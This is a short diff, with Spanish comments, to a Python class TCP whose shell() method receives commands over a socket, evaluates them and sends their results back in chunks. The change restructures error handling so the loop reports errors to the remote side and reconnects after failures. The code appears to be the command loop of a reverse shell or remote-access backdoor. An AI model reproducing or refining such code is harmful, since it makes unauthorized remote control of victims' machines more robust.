@@ -802,8 +802,8 @@ class TCP:
 
     # Funcion para recibir y evaluar comandos
     def shell(self):
-        try:
-            while True:
+        while True:
+            try:
                 # Se recibe el comando
                 cmd = self.__sock.recv(1024).decode()
 
@@ -1015,8 +1015,9 @@ class TCP:
                                     self.enviarDatos(info[i:i+self.__chunk].encode())
                                     i += self.__chunk
 
-                    except:
-                        continue
+                    except Exception as e:
+                        self.__sock.send(f"[-] {str(e)}".encode())
 
-        except:
-            self.conectar()
+            except:
+                self.conectar()
+
